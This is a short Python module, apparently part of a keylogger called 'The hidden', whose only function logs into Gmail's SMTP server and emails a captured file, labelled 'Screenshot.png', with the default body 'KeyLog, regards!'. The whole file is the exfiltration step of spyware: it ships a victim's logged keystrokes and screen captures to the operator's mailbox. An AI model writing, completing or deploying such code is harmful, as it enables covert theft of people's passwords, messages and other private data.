'''

The hidden ^_^ 

Created on 27/10/2017

@author: 
'''
import smtplib
from email.mime.text import MIMEText 
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.encoders import encode_base64

def send_mail(from_addr, to_addr, password, send_text='KeyLog, regards!', file=None):
   
    # Host and port SMTP of Gmail
    gmail = smtplib.SMTP('smtp.gmail.com:587')
    gmail.starttls()    # Crypted protocol
    gmail.login(from_addr, password)
    
    # Built a mail
    mail = MIMEMultipart()
    mail['Subject'] = 'LogTest'
    mail['From'] = 'thehidden'
    mail['To'] = to_addr
    
    text = MIMEText(send_text)
    mail.attach(text)
    
    attach_file = MIMEBase('application', 'octet-stream')
    attach_file.set_payload(file.read())
    encode_base64(attach_file)
    attach_file.add_header('Content-Disposition', 'attachment; filename = "Screenshot.png"')
    mail.attach(attach_file)
    
    gmail.sendmail(from_addr, to_addr, mail.as_string())
    
    gmail.quit()      
